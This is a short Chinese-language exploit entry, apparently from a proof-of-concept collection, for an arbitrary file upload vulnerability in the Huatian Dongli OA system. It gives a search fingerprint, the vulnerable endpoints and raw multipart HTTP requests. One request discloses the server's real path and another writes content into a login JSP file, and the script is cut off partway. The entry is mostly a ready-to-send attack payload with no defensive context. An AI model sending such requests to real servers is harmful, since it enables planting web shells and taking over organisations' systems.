# 华天动力OA系统upload.jsp任意文件上传漏洞

- **系统**：华天动力OA系统upload.jsp　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/OAapp/WebObjects/OAapp.woa"`
- **请求**：`POST /OAapp/jsp/upload.jsp HTTP/1.1`

**请求体 / payload**
```
获取绝对路径
Host:
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5Ur8laykKAWws2QO
Content-Length: 293
------WebKitFormBoundary5Ur8laykKAWws2QO
Content-Disposition: form-data; name="file"; filename="xxx.xml"
Content-Type: image/png
real path
------WebKitFormBoundary5Ur8laykKAWws2QO
Content-Disposition: form-data; name="filename"
xxx.png
------WebKitFormBoundary5Ur8laykKAWws2QO--
将“123”写入到normalLoginPageForOther.jsp文件中去
POST /OAapp/htpages/app/module/trace/component/fileEdit/ntkoupload.jsp HTTP/1.1
Host:
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzRSYXfFlXqk6…（脚本共 996 字，完整版见原文）
```
- **预期**：200　|　—